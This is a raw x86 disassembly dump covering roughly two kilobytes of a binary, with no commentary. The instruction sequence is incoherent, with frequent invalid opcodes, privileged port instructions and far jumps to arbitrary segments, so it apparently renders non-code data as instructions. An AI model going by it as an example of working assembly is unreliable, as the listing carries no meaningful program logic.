  41e4c0:	add    BYTE PTR [eax],al
  41e4c2:	add    BYTE PTR [ebp+0x6a],dl
  41e4c5:	jmp    0x951b:0x1214096f
  41e4cc:	dec    ecx
  41e4cd:	mov    esp,0xe382fffe
  41e4d2:	adc    DWORD PTR [eax+0x48],esp
  41e4d5:	cmp    BYTE PTR gs:[eax+0x7b59aee2],bl
  41e4dc:	nop
  41e4dd:	test   DWORD PTR [ebx-0x31939c40],esi
  41e4e3:	icebp  
  41e4e4:	clc    
  41e4e5:	sti    
  41e4e6:	cmp    bh,bh
  41e4e8:	out    0xe,eax
  41e4ea:	les    edi,FWORD PTR [ecx+0x6b6366b1]
  41e4f0:	adc    eax,0xd956996c
  41e4f5:	stos   DWORD PTR es:[edi],eax
  41e4f6:	sub    BYTE PTR [esi-0x7],ah
  41e4f9:	out    0xa4,al
  41e4fb:	cs cmp eax,0xa723066
  41e501:	ror    eax,cl
  41e503:	or     eax,0x5b4a78e7
  41e508:	les    ebp,FWORD PTR [esi+0x1b]
  41e50b:	ss sbb edi,edx
  41e50e:	(bad)  
  41e50f:	(bad)  
  41e510:	aas    
  41e511:	ins    BYTE PTR es:[edi],dx
  41e512:	xor    eax,ebx
  41e514:	icebp  
  41e515:	and    BYTE PTR [esi+0x78978011],0xe9
  41e51c:	mov    ah,0x93
  41e51e:	aaa    
  41e51f:	sbb    BYTE PTR fs:[ecx],dh
  41e522:	inc    ebx
  41e523:	adc    BYTE PTR [ebp+0x4b],bl
  41e526:	mov    bl,0x4d
  41e528:	add    al,0x41
  41e52a:	repnz mov dh,0xe4
  41e52d:	das    
  41e52e:	jae    0x41e582
  41e530:	mov    al,dl
  41e532:	data16 jl 0x41e5a8
  41e535:	pop    ss
  41e536:	aam    0xc9
  41e538:	cmp    DWORD PTR [eax+0x6444af06],edx
  41e53e:	shl    DWORD PTR [ecx+0x77792172],1
  41e544:	jmp    0xa3db:0x2c763b12
  41e54b:	or     BYTE PTR [eax-0x6c000e23],bh
  41e551:	ja     0x41e5ad
  41e553:	shl    ch,0xe5
  41e556:	icebp  
  41e557:	or     bl,BYTE PTR [esi+ebx*1+0xc4c4877]
  41e55e:	dec    ecx
  41e55f:	xchg   edi,eax
  41e560:	sbb    DWORD PTR [ecx+0x31],edx
  41e563:	mov    dh,0x81
  41e565:	sub    DWORD PTR [eax-0x31511a7e],ecx
  41e56b:	nop
  41e56c:	mov    eax,ds:0xd8b1c7
	...
  41e579:	add    BYTE PTR [eax],al
  41e57b:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  41e57f:	test   DWORD PTR [ebx-0xce58301],0xc9614cfc
  41e589:	pop    ecx
  41e58a:	stc    
  41e58b:	adc    DWORD PTR [edx+0xad0001],esp
  41e591:	add    BYTE PTR [eax],al
  41e593:	out    dx,eax
  41e594:	test   DWORD PTR [ebx+0x70bd4f15],ebp
  41e59a:	jns    0x41e60a
  41e59c:	in     al,dx
  41e59d:	mov    bh,0x57
  41e59f:	mov    eax,0x869ec503
  41e5a4:	jbe    0x41e5ab
  41e5a6:	or     dl,BYTE PTR [edi+0x5bf79a2c]
  41e5ac:	mov    WORD PTR [esi+0x4],es
  41e5af:	jecxz  0x41e54d
  41e5b1:	cdq    
  41e5b2:	inc    eax
  41e5b3:	popf   
  41e5b4:	mov    ah,al
  41e5b6:	test   al,0xfa
  41e5b8:	cmp    esi,DWORD PTR ds:0x6e087cb8
  41e5be:	sbb    cl,0xc6
  41e5c1:	sub    DWORD PTR ds:0x750ef340,esp
  41e5c7:	lods   al,BYTE PTR ds:[esi]
  41e5c8:	scas   al,BYTE PTR es:[edi]
  41e5c9:	into   
  41e5ca:	xchg   esi,eax
  41e5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5cc:	ret    0xef01
  41e5cf:	or     ah,dh
  41e5d1:	dec    ecx
  41e5d2:	sar    BYTE PTR [edx-0x26],cl
  41e5d5:	outs   dx,BYTE PTR ds:[esi]
  41e5d6:	add    BYTE PTR [ebx+0x2e],bl
  41e5d9:	pop    edx
  41e5da:	dec    esi
  41e5db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5dc:	dec    edx
  41e5dd:	jns    0x41e59f
  41e5df:	jne    0x41e64d
  41e5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5e2:	data16 add al,0xf8
  41e5e5:	pop    esp
  41e5e6:	and    eax,0xf2ad9018
  41e5eb:	es (bad) 
  41e5ed:	jb     0x41e5af
  41e5ef:	test   DWORD PTR [edx+0x77ff1096],ebx
  41e5f5:	jae    0x41e5de
  41e5f7:	aaa    
  41e5f8:	lods   eax,DWORD PTR ds:[esi]
  41e5f9:	sar    BYTE PTR [ebp+0x97baf76],0xed
  41e600:	sbb    ebp,DWORD PTR [edx+0x5b61db02]
  41e606:	mov    edi,0x9f13c033
  41e60b:	push   ds
  41e60c:	xchg   ebp,eax
  41e60d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e60e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e60f:	inc    edi
  41e610:	cs hlt 
  41e612:	mov    ss,WORD PTR [esi-0x60738e18]
  41e618:	lahf   
  41e619:	cli    
  41e61a:	sbb    al,0xf6
  41e61c:	pop    ebp
  41e61d:	mov    edi,0xc00841d2
  41e622:	sub    edi,esi
  41e624:	mov    ds:0x9388947e,eax
  41e629:	ss ins BYTE PTR es:[edi],dx
  41e62b:	push   ebx
  41e62c:	or     esi,DWORD PTR [ebx+0x8]
  41e62f:	xor    al,0x26
  41e631:	xchg   esp,eax
  41e632:	ins    DWORD PTR es:[edi],dx
  41e633:	rol    dh,0xf5
  41e636:	cli    
  41e637:	pop    edx
  41e638:	test   al,0x94
  41e63a:	mov    es,eax
  41e63c:	cld    
  41e63d:	adc    dl,al
  41e63f:	sbb    al,BYTE PTR [eax]
	...
  41e649:	add    BYTE PTR [eax],al
  41e64b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e64f:	jne    0x41e6b0
  41e651:	jg     0x41e68d
  41e653:	clc    
  41e654:	cs aas 
  41e656:	push   0x5a4cd9df
  41e65b:	push   0xffffff8a
  41e65d:	add    DWORD PTR [eax],eax
  41e65f:	lods   eax,DWORD PTR ds:[esi]
  41e660:	add    BYTE PTR [eax],al
  41e662:	add    BYTE PTR [ecx],ah
  41e664:	sbb    al,0x13
  41e666:	lea    esp,[edx]
  41e668:	(bad)  
  41e669:	jbe    0x41e691
  41e66b:	jns    0x41e61d
  41e66d:	sti    
  41e66e:	or     al,0xf4
  41e670:	ja     0x41e612
  41e672:	jmp    0xb7524ca1
  41e677:	xor    bl,ah
  41e679:	jmp    0x6721fbc
  41e67e:	jo     0x41e69b
  41e680:	imul   esp,edi,0x4
  41e683:	sahf   
  41e684:	pop    edi
  41e685:	adc    BYTE PTR ds:0xad22bf31,ah
  41e68b:	aam    0x0
  41e68d:	adc    ecx,eax
  41e68f:	scas   al,BYTE PTR es:[edi]
  41e690:	or     eax,0x3c148b0c
  41e695:	aam    0xe8
  41e697:	lahf   
  41e698:	icebp  
  41e699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e69a:	fadd   DWORD PTR [eax]
  41e69c:	mov    WORD PTR [edx],?
  41e69e:	add    DWORD PTR [eax+0x2b3905d3],eax
  41e6a4:	gs vdivps ymm7,ymm2,ymm7
  41e6a9:	je     0x41e706
  41e6ab:	fiadd  DWORD PTR [eax]
  41e6ad:	jne    0x41e6b1
  41e6af:	call   0xbde86680
  41e6b4:	sbb    edx,DWORD PTR [eax+ebp*4-0x1c38f55c]
  41e6bb:	nop
  41e6bc:	jae    0x41e710
  41e6be:	out    0x7,eax
  41e6c0:	add    DWORD PTR [ecx-0x3d3da61e],edi
  41e6c6:	pop    eax
  41e6c7:	and    esi,DWORD PTR [ebx-0x2bde57e5]
  41e6cd:	ins    DWORD PTR es:[edi],dx
  41e6ce:	jno    0x41e6f7
  41e6d0:	shl    BYTE PTR [ecx],1
  41e6d2:	jae    0x41e69b
  41e6d4:	es repz call 0x7f4ce909
  41e6db:	shl    BYTE PTR ds:[ecx+0x1d],cl
  41e6df:	ins    BYTE PTR es:[edi],dx
  41e6e0:	cld    
  41e6e1:	ins    DWORD PTR es:[edi],dx
  41e6e2:	out    dx,eax
  41e6e3:	cs into 
  41e6e5:	call   0x4199:0xfe7a0aad
  41e6ec:	mov    BYTE PTR [edx],0x55
  41e6ef:	sbb    eax,0xd1ad3ab3
  41e6f4:	xor    al,0xae
  41e6f6:	pushf  
  41e6f7:	test   BYTE PTR [ebp-0x4c],bh
  41e6fa:	xchg   ecx,eax
  41e6fb:	scas   eax,DWORD PTR es:[edi]
  41e6fc:	loopne 0x41e772
  41e6fe:	inc    esp
  41e6ff:	add    edx,esi
  41e701:	push   esp
  41e702:	lods   al,BYTE PTR ds:[esi]
  41e703:	xlat   BYTE PTR ds:[ebx]
  41e704:	xor    eax,DWORD PTR [eax]
  41e706:	in     eax,0xc9
  41e708:	sbb    ecx,edi
  41e70a:	pushf  
  41e70b:	jmp    0x0:0xcaa06b62
	...
  41e71a:	add    BYTE PTR [eax],cl
  41e71c:	mov    cl,0x72
  41e71e:	cmp    edi,ebx
  41e720:	sti    
  41e721:	dec    ecx
  41e722:	mov    bl,0x94
  41e724:	je     0x41e6fd
  41e726:	call   0x8b17:0x7f906b4e
  41e72d:	add    DWORD PTR [eax],eax
  41e72f:	lods   eax,DWORD PTR ds:[esi]
  41e730:	add    BYTE PTR [eax],al
  41e732:	add    BYTE PTR [esi+0x2f],cl
  41e735:	lea    ebp,[eax+0x16]
  41e738:	pop    ss
  41e739:	inc    edi
  41e73a:	inc    ecx
  41e73b:	push   edi
  41e73c:	scas   al,BYTE PTR es:[edi]
  41e73d:	dec    ebx
  41e73e:	mov    esp,0x3776e5d5
  41e743:	clc    
  41e744:	jmp    0x5f7f:0xe38956a0
  41e74b:	pop    eax
  41e74c:	inc    edx
  41e74d:	(bad)  
  41e74e:	in     al,0x54
  41e750:	pop    esp
  41e751:	das    
  41e752:	lahf   
  41e753:	adc    eax,0x2feae5fa
  41e758:	fs push es
  41e75a:	in     al,0x5d
  41e75c:	inc    ebx
  41e75d:	(bad)  
  41e75e:	mov    ecx,0x729f5c84
  41e763:	(bad)  
  41e764:	mov    ds:0x32110d7d,al
  41e769:	loopne 0x41e6fb
  41e76b:	push   0x4f900bd2
  41e770:	cmp    eax,0x31490aa5
  41e775:	pop    ebp
  41e776:	or     eax,0x5c050a65
  41e77b:	test   al,0x99
  41e77d:	mov    al,0x56
  41e77f:	mov    WORD PTR [ebp-0x6a],gs
  41e782:	stc    
  41e783:	adc    DWORD PTR [edx-0x3],edi
  41e786:	push   ebp
  41e787:	or     esp,esi
  41e789:	shl    BYTE PTR [eax+ebp*1+0x6c],1
  41e78d:	sub    eax,0x88451b07
  41e792:	rcr    DWORD PTR [edi],1
  41e794:	xor    edi,DWORD PTR [ecx]
  41e796:	xchg   ebp,eax
  41e797:	out    0x4a,al
  41e799:	(bad)  
  41e79a:	cmp    ebp,ecx
  41e79c:	xchg   edi,eax
  41e79d:	jecxz  0x41e791
  41e79f:	adc    BYTE PTR [edx-0x3a],al
  41e7a2:	mov    eax,0x74ee601f
  41e7a7:	push   edx
  41e7a8:	xchg   edx,eax
  41e7a9:	xchg   edi,eax
  41e7aa:	test   DWORD PTR [ecx+0xa625464],0x8ce421fa
  41e7b4:	aas    
  41e7b5:	ror    BYTE PTR [ebp+0x7ce45122],0xd
  41e7bc:	adc    eax,0xd1c00225
  41e7c1:	xor    al,0xa4
  41e7c3:	dec    esi
  41e7c4:	repnz adc dl,ch
  41e7c7:	dec    esp
  41e7c8:	sar    BYTE PTR [ebx-0x5d8d89da],0x6e
  41e7cf:	jp     0x41e767
  41e7d1:	or     ebp,DWORD PTR [ecx]
  41e7d3:	dec    ebp
  41e7d4:	ins    DWORD PTR es:[edi],dx
  41e7d5:	xchg   ebx,eax
  41e7d6:	push   ds
  41e7d7:	mov    ch,0xd6
  41e7d9:	jne    0x41e7fe
  41e7db:	cld    
  41e7dc:	sbb    eax,0x81edba
	...
  41e7e9:	add    BYTE PTR [eax],al
  41e7eb:	fist   WORD PTR [ebx-0x4e]
  41e7ee:	dec    edi
  41e7ef:	mov    esi,0x67d3ffef
  41e7f4:	xchg   ecx,edi
  41e7f6:	adc    al,0x66
  41e7f8:	push   ebp
  41e7f9:	dec    bx
  41e7fb:	les    ecx,FWORD PTR [ebx+0xad0001]
  41e801:	add    BYTE PTR [eax],al
  41e803:	sbb    BYTE PTR [eax],bh
  41e805:	aam    0x88
  41e807:	das    
  41e808:	popa   
  41e809:	adc    al,BYTE PTR [ebx-0x39]
  41e80c:	mov    ebp,0x490f6036
  41e811:	and    BYTE PTR [eax],bh
  41e813:	loope  0x41e861
  41e815:	bound  edx,QWORD PTR [edx]
  41e817:	and    esp,edi
  41e819:	daa    
  41e81a:	ss pop ecx
  41e81c:	fwait
  41e81d:	mul    BYTE PTR [ebx-0x43]
  41e820:	test   eax,0x6b719f23
  41e825:	test   BYTE PTR [eax-0x3f],dh
  41e828:	jnp    0x41e83f
  41e82a:	call   0x3a71:0x3fc47cbe
  41e831:	push   ss
  41e832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e833:	cmp    bh,BYTE PTR [edx+ebp*4]
  41e836:	jbe    0x41e853
  41e838:	jmp    0x9a30:0x7feba3fa
  41e83f:	cmp    DWORD PTR [ecx+0x44],edx
  41e842:	ds adc eax,esi
  41e845:	out    dx,eax
  41e846:	sar    DWORD PTR [edi-0x36],cl
  41e849:	stos   BYTE PTR es:[edi],al
  41e84a:	sub    al,0xa
  41e84c:	pop    es
  41e84d:	out    dx,al
  41e84e:	into   
  41e84f:	add    DWORD PTR [ecx-0x2dd668dd],0x38386f80
  41e859:	mov    cl,0xe8
  41e85b:	pop    edx
  41e85c:	pop    eax
  41e85d:	push   esi
  41e85e:	push   ds
  41e85f:	pop    edx
  41e860:	sub    ebp,DWORD PTR [eax]
  41e862:	or     al,0x1
  41e864:	mov    ds:0x7f1c392d,al
  41e869:	cmp    eax,0xd71d1bc2
  41e86e:	xlat   BYTE PTR ds:[ebx]
  41e86f:	loope  0x41e85a
  41e871:	dec    ebx
  41e872:	std    
  41e873:	adc    eax,0xf4c6a3de
  41e878:	mov    ah,0x25
  41e87a:	xchg   DWORD PTR [ebx+0x1aacc5e],edi
  41e880:	lods   eax,DWORD PTR ds:[esi]
  41e881:	cli    
  41e882:	mov    DWORD PTR ds:0x7a8c43a3,ecx
  41e888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e889:	out    0x27,eax
  41e88b:	(bad)  
  41e88e:	pop    edi
  41e88f:	loop   0x41e88c
  41e891:	pop    edx
  41e892:	cmp    BYTE PTR [ebp+0x10],ah
  41e895:	pop    eax
  41e896:	arpl   WORD PTR [edi+esi*2-0x73],dx
  41e89a:	xor    al,bh
  41e89c:	mov    eax,0xad1648e1
  41e8a1:	xchg   edi,eax
  41e8a2:	xchg   ecx,eax
  41e8a3:	pop    edi
  41e8a4:	leave  
  41e8a5:	lds    ebx,FWORD PTR [edi+edi*4+0x3d]
  41e8a9:	stos   DWORD PTR es:[edi],eax
  41e8aa:	out    0x36,eax
  41e8ac:	add    BYTE PTR [ecx],cl
  41e8ae:	sub    cl,BYTE PTR [edx+0x0]
  41e8b4:	add    BYTE PTR [eax],al
  41e8b6:	add    BYTE PTR [eax],al
  41e8b8:	add    BYTE PTR [eax],al
  41e8ba:	add    BYTE PTR [edi-0x24252cf4],al
  41e8c0:	fisttp WORD PTR [edi+0x640ccb5d]
  41e8c6:	push   ss
  41e8c7:	push   ebx
  41e8c8:	push   cs
  41e8c9:	dec    ebx
  41e8ca:	mov    ds:0x18c71,eax
  41e8cf:	lods   eax,DWORD PTR ds:[esi]
  41e8d0:	add    BYTE PTR [eax],al
  41e8d2:	add    BYTE PTR [esi-0x76],al
  41e8d5:	mov    DWORD PTR es:[edi-0x44],0x61a475bf
  41e8dd:	les    ebx,FWORD PTR [esi]
  41e8df:	jp     0x41e91f
  41e8e1:	(bad)  
  41e8e2:	pop    edi
  41e8e3:	retf   
  41e8e4:	loope  0x41e94a
  41e8e6:	mov    eax,0x86898f58
  41e8eb:	jl     0x41e8a9
  41e8ed:	sub    edx,DWORD PTR [ebx-0x41]
  41e8f0:	sub    DWORD PTR [ebp-0x1a49836b],esi
  41e8f6:	jns    0x41e8c7
  41e8f8:	inc    edi
  41e8f9:	and    al,0xe1
  41e8fb:	mov    WORD PTR [ebp-0x67a0743c],ds
  41e901:	mov    ch,bl
  41e903:	inc    eax
  41e904:	out    dx,eax
  41e905:	xchg   BYTE PTR [edx-0x4312961c],ah
  41e90b:	inc    ebp
  41e90c:	sub    edi,DWORD PTR [ebp-0x2c]
  41e90f:	mov    DWORD PTR [ebx-0x6e],esp
  41e912:	jmp    0x6642572f
  41e917:	cmp    eax,0xcd84764b
  41e91c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e91d:	stos   DWORD PTR es:[edi],eax
  41e91e:	or     bh,dl
  41e920:	xor    ch,dh
  41e922:	mov    ecx,0x2cb885ec
  41e927:	ror    dl,cl
  41e929:	cmp    al,0xf6
  41e92b:	mov    dl,0x5
  41e92d:	leave  
  41e92e:	rcl    BYTE PTR [eax],0x3f
  41e931:	or     eax,0x8f780762
  41e936:	sar    dh,1
  41e938:	push   edx
  41e939:	iret   
  41e93a:	xchg   ebp,eax
  41e93b:	mov    gs,WORD PTR [eax-0x45]
  41e93e:	cmp    ch,bh
  41e940:	xor    al,0xba
  41e942:	in     eax,0xbb
  41e944:	sar    BYTE PTR [edi+0x1667ec8e],0xeb
  41e94b:	pop    eax
  41e94c:	fcom   QWORD PTR [eax]
  41e94e:	pop    ds
  41e94f:	cmc    
  41e950:	inc    edi
  41e951:	pop    eax
  41e952:	cmp    bh,BYTE PTR [edi]
  41e954:	retf   
  41e955:	enter  0xcbd0,0x57
  41e959:	repz mov eax,0x61667a8f
  41e95f:	mov    ds:0xf6918aff,eax
  41e964:	rcr    ah,1
  41e966:	adc    dh,BYTE PTR [esi]
  41e968:	shl    BYTE PTR [edx+0x39],1
  41e96b:	sar    bl,1
  41e96d:	push   cs
  41e96e:	sub    dl,BYTE PTR [ebx+0x2c20f7bf]
  41e974:	test   edx,edi
  41e976:	and    BYTE PTR [ebp+edx*4-0x3a19d382],0xd3
  41e97e:	retf   0xe3
	...
  41e989:	add    BYTE PTR [eax],al
  41e98b:	lahf   
  41e98c:	arpl   WORD PTR [ebp+0x72],cx
  41e98f:	std    
  41e990:	jle    0x41e951
  41e992:	out    dx,eax
  41e993:	sbb    edi,esp
  41e995:	mov    BYTE PTR [ebx+edx*2+0x1e8f5f10],dh
  41e99c:	lea    eax,[ecx]
  41e99e:	add    BYTE PTR [ebp+0x2c000000],ch
  41e9a4:	sbb    DWORD PTR [edi-0x75846a6a],esi
  41e9aa:	push   edi
  41e9ab:	push   ebx
  41e9ac:	mov    ds:0x55ed0d5f,al
  41e9b1:	popa   
  41e9b2:	dec    esi
  41e9b3:	ds pop ebp
  41e9b5:	add    DWORD PTR [ebx-0x43b5ccdf],edi
  41e9bb:	ss mov ebx,0x696fb2c9
  41e9c1:	adc    al,0x9a
  41e9c3:	arpl   si,bx
  41e9c5:	sub    eax,0xe1ac1b7
  41e9ca:	pop    es
  41e9cb:	stc    
  41e9cc:	repz js 0x41e978
  41e9cf:	lahf   
  41e9d0:	mov    edi,0x2f531d19
  41e9d5:	jb     0x41ea3b
  41e9d7:	xor    ch,BYTE PTR [ebx+0x4e]
  41e9da:	push   ecx
  41e9db:	and    al,0x40
  41e9dd:	pop    eax
  41e9de:	jnp    0x41e9b2
  41e9e0:	pop    ecx
  41e9e1:	mov    al,dl
  41e9e3:	popf   
  41e9e4:	rcr    BYTE PTR [edi],1
  41e9e6:	mov    ds:0xb6271a00,eax
  41e9eb:	lds    edx,FWORD PTR [ebx+0x37]
  41e9ee:	or     esp,DWORD PTR [ecx+0x5f8e40c7]
  41e9f4:	and    al,0xac
  41e9f6:	enter  0xbf6a,0x39
  41e9fa:	(bad)  
  41e9fb:	mov    edx,0x1842dfe6
  41ea00:	mov    al,ds:0xb0cd4b85
  41ea05:	xor    edx,DWORD PTR [edi]
  41ea07:	stos   DWORD PTR es:[edi],eax
  41ea08:	pop    ss
  41ea09:	cld    
  41ea0a:	lds    edi,FWORD PTR [ebp+0x4081f176]
  41ea10:	cdq    
  41ea11:	adc    eax,0xbb9f60cb
  41ea16:	xchg   ebp,eax
  41ea17:	jle    0x41ea76
  41ea19:	push   ecx
  41ea1a:	dec    edi
  41ea1b:	ret    
  41ea1c:	xchg   edi,eax
  41ea1d:	int3   
  41ea1e:	mov    al,ds:0x7de55858
  41ea23:	push   es
  41ea24:	mov    eax,DWORD PTR [eax+ecx*4+0x2a4b8a27]
  41ea2b:	cmc    
  41ea2c:	sbb    eax,0xd8a4ab25
  41ea31:	xchg   BYTE PTR [eax-0x62958731],al
  41ea37:	sub    eax,0x6372b1ba
  41ea3c:	xchg   edx,eax
  41ea3d:	jmp    0xdc2a:0x573f8da5
  41ea44:	inc    ebp
  41ea45:	push   ebp
  41ea46:	leave  
  41ea47:	pop    esp
  41ea48:	in     eax,dx
  41ea49:	mov    eax,0x49db3d1b
  41ea4e:	adc    al,0x33
	...
  41ea58:	add    BYTE PTR [eax],al
  41ea5a:	add    BYTE PTR [eax+0x23],dh
  41ea5d:	and    eax,0x7c6f7769
  41ea62:	cmp    esp,DWORD PTR [eax+0x24bcee1c]
  41ea68:	test   eax,0x8dcb19ad
  41ea6d:	add    DWORD PTR [eax],eax
  41ea6f:	lods   eax,DWORD PTR ds:[esi]
  41ea70:	add    BYTE PTR [eax],al
  41ea72:	add    BYTE PTR [eax-0x47],al
  41ea75:	mov    WORD PTR [ebp+ecx*2+0x32],?
  41ea79:	fdivr  QWORD PTR [edi]
  41ea7b:	inc    ebx
  41ea7c:	lods   eax,DWORD PTR ds:[esi]
  41ea7d:	push   ss
  41ea7e:	outs   dx,BYTE PTR ds:[esi]
  41ea7f:	inc    ebx
  41ea80:	aaa    
  41ea81:	mov    ds:0x9434e3cd,eax
  41ea86:	(bad)  
  41ea87:	inc    ebx
  41ea88:	xor    eax,0x9a82ec8f
  41ea8d:	ja     0x41eaae
  41ea8f:	sub    BYTE PTR [edi],dh
  41ea91:	add    bh,0x61
  41ea94:	sbb    ah,cl
  41ea96:	(bad)  
  41ea97:	retf   
  41ea98:	cs out 0x6e,eax
  41ea9b:	or     cl,BYTE PTR [esi-0x41]
  41ea9e:	jmp    0x3a2d:0xdcd92d5f
  41eaa5:	add    cl,ch
  41eaa7:	imul   ecx,esp,0xffffff97
  41eaaa:	rcr    BYTE PTR [edx],cl
  41eaac:	xlat   BYTE PTR ds:[ebx]
  41eaad:	int    0x1c
  41eaaf:	jl     0x41eafb
  41eab1:	rcr    BYTE PTR [ecx+0x3f],1
  41eab4:	ins    DWORD PTR es:[edi],dx
  41eab5:	inc    esp
  41eab6:	xor    ebp,DWORD PTR [edx-0x62106b18]
  41eabc:	xchg   esp,eax
  41eabd:	add    dh,BYTE PTR es:[edi-0x27]
  41eac1:	or     dh,bh
  41eac3:	repnz out dx,eax
  41eac5:	pop    ss
  41eac6:	out    dx,al
  41eac7:	and    BYTE PTR [eax*8+0x1516f686],bh
  41eace:	call   0xc7b62ae6
  41ead3:	inc    esp
  41ead4:	push   cs
  41ead5:	jle    0x41eb3d
  41ead7:	iret   
  41ead8:	add    dh,BYTE PTR [ebx]
  41eada:	in     eax,0xd2
  41eadc:	sbb    BYTE PTR [si],ah
  41eadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae0:	and    eax,0x32119ece
  41eae5:	(bad)  
  41eae6:	outs   dx,DWORD PTR ds:[esi]
  41eae7:	scas   al,BYTE PTR es:[edi]
  41eae8:	retf   
  41eae9:	(bad)  
  41eaea:	or     ebx,DWORD PTR [ebx]
  41eaec:	xchg   esp,eax
  41eaed:	out    0x11,al
  41eaef:	ret    
  41eaf0:	les    edi,FWORD PTR [ebx-0x27]
  41eaf3:	fbld   TBYTE PTR [ebx+0x4a80c12a]
  41eaf9:	sar    BYTE PTR [ebx-0x1ecc976a],1
  41eaff:	xchg   BYTE PTR [esi+edx*2-0x57669270],bh
  41eb06:	ja     0x41eb85
  41eb08:	sbb    esi,DWORD PTR [ebx-0x56]
  41eb0b:	or     esi,DWORD PTR gs:[edx+0x2db446ef]
  41eb12:	je     0x41ead7
  41eb14:	cmp    BYTE PTR [edi],0xb
  41eb17:	jmp    0x41eab2
  41eb19:	arpl   bx,sp
  41eb1b:	inc    esp
  41eb1c:	xor    DWORD PTR fs:[edx],esi
  41eb1f:	icebp  
	...
  41eb28:	add    BYTE PTR [eax],al
  41eb2a:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  41eb31:	popf   
  41eb32:	aam    0x57
  41eb34:	(bad)
  41eb38:	loopne 0x41eb9b
  41eb3a:	stc    
  41eb3b:	js     0x41eacb
  41eb3d:	add    DWORD PTR [eax],eax
  41eb3f:	lods   eax,DWORD PTR ds:[esi]
  41eb40:	add    BYTE PTR [eax],al
  41eb42:	add    dl,dh
  41eb44:	test   DWORD PTR [edi+0x176d5e75],esi
  41eb4a:	push   esi
  41eb4b:	in     al,dx
  41eb4c:	sbb    eax,0xa556c4f5
  41eb51:	out    0xcc,eax
  41eb53:	ss mov cl,0x45
  41eb56:	push   ebp
  41eb57:	dec    edi
  41eb58:	mov    bh,0x2a
  41eb5a:	push   0x50
  41eb5c:	xor    esp,edx
  41eb5e:	call   0x3ef14ee0
  41eb63:	fiadd  DWORD PTR [eax+edx*8]
  41eb66:	int3   
  41eb67:	mov    esp,0x7b0bc567
  41eb6c:	add    DWORD PTR [ebp+0x75],0xd96aa5c3
  41eb73:	inc    edi
  41eb74:	ficom  DWORD PTR [eax-0x6a]
  41eb77:	out    0x5,al
  41eb79:	mov    ch,0x3d
  41eb7b:	jbe    0x41ebf0
  41eb7d:	sub    eax,0xac12d193
  41eb82:	sar    eax,1
  41eb84:	mov    ebp,0x93c28e0e
  41eb89:	or     al,ah
  41eb8b:	psubq  mm2,QWORD PTR [esi+eiz*4+0x72]
  41eb90:	push   ecx
  41eb91:	pop    edi
  41eb92:	loopne 0x41eb63
  41eb94:	and    BYTE PTR [edx],0xc9
  41eb97:	cmp    ecx,DWORD PTR [esi-0x217b07b7]
  41eb9d:	mov    ebp,0x4d7dc93b
  41eba2:	or     ebx,DWORD PTR [eax]
  41eba4:	lahf   
  41eba5:	push   esi
  41eba6:	dec    esp
  41eba7:	push   cs
  41eba8:	nop
  41eba9:	mov    ds:0xa74c828e,eax
  41ebae:	popf   
  41ebaf:	fiadd  DWORD PTR [eax+0x25a32347]
  41ebb5:	fiadd  DWORD PTR [ecx+eiz*1]
  41ebb8:	das    
  41ebb9:	mov    ecx,0xc01dd2d4
  41ebbe:	adc    eax,ebx
  41ebc0:	push   edx
  41ebc1:	fimul  WORD PTR [edx-0x7f]
  41ebc4:	imul   esp,DWORD PTR [ebx+0x39],0x41
  41ebc8:	or     al,0x21
  41ebca:	popf   
  41ebcb:	pop    ss
  41ebcc:	ins    DWORD PTR es:[edi],dx
  41ebcd:	ret    
  41ebce:	sub    BYTE PTR [ecx+ebx*2],0x9b
  41ebd2:	aam    0xe5
  41ebd4:	je     0x41ebb2
  41ebd6:	lock or ch,dl
  41ebd9:	lahf   
  41ebda:	outs   dx,BYTE PTR ds:[esi]
  41ebdb:	pop    eax
  41ebdc:	loopne 0x41eba2
  41ebde:	jmp    0x41ec4e
  41ebe0:	or     BYTE PTR [ebx-0x8fd2c57],dl
  41ebe6:	fcom   DWORD PTR [ebx]
  41ebe8:	popa   
  41ebe9:	sbb    eax,0x64f62cef
  41ebee:	adc    edx,DWORD PTR [esi+0x0]
  41ebf4:	add    BYTE PTR [eax],al
  41ebf6:	add    BYTE PTR [eax],al
  41ebf8:	add    BYTE PTR [eax],al
  41ebfa:	add    ah,dh
  41ebfc:	mov    dl,0x32
  41ebfe:	(bad)  
  41ebff:	jbe    0x41ebd7
  41ec01:	hlt    
  41ec02:	mov    dl,0xb1
  41ec04:	and    al,0xfe
  41ec06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec07:	inc    ecx
  41ec08:	call   0x8f670e00
  41ec0d:	add    DWORD PTR [eax],eax
  41ec0f:	lods   eax,DWORD PTR ds:[esi]
  41ec10:	add    BYTE PTR [eax],al
  41ec12:	add    BYTE PTR [ebx+0x54],bh
  41ec15:	int3   
  41ec16:	push   es
  41ec17:	sub    edi,DWORD PTR [ebp-0x3f]
  41ec1a:	aas    
  41ec1b:	add    bl,BYTE PTR [esi]
  41ec1d:	push   esi
  41ec1e:	xchg   ebx,eax
  41ec1f:	mov    edi,0x89cd649
  41ec24:	inc    edx
  41ec25:	sar    DWORD PTR [esi-0x72],cl
  41ec28:	dec    eax
  41ec29:	aad    0x8f
  41ec2b:	sub    ah,dl
  41ec2d:	retf   
  41ec2e:	adc    eax,0x1721550d
  41ec33:	or     DWORD PTR [edx-0x1aea5739],esp
  41ec39:	cdq    
  41ec3a:	mov    BYTE PTR [ebp+0x22],al
  41ec3d:	xchg   edi,eax
  41ec3e:	xchg   ecx,eax
  41ec3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec40:	(bad)  
  41ec41:	mov    cl,0xf2
  41ec43:	pop    es
  41ec44:	pusha  
  41ec45:	aad    0xce
  41ec47:	scas   al,BYTE PTR es:[edi]
  41ec48:	les    esp,FWORD PTR [edx]
